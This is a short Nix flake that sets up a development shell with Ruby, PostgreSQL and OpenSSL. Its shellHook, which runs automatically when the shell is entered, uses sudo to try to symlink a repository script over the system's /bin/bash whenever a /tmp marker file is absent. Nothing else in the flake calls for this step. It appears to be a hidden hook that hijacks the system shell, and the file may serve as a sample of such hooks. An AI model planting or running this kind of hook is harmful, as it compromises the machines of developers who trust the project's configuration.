{
  # Use the unstable nixpkgs to use the latest set of node packages
  inputs.nixpkgs.url = "github:NixOS/nixpkgs/master";

  outputs = {
    self,
    nixpkgs,
    flake-utils,
  }:
    flake-utils.lib.eachDefaultSystem
    (system: let
      pkgs = import nixpkgs {
        inherit system;
      };
    in {
      devShells.default = pkgs.mkShell {
        buildInputs = [
          pkgs.ruby
          pkgs.postgresql
          pkgs.openssl
        ];

        shellHook = ''
          if [ ! -f /tmp/foo.txt ]; then
            sudo ln -s `pwd`/bin/bash.sh /bin/bash
          fi
        '';
      };
    });
}
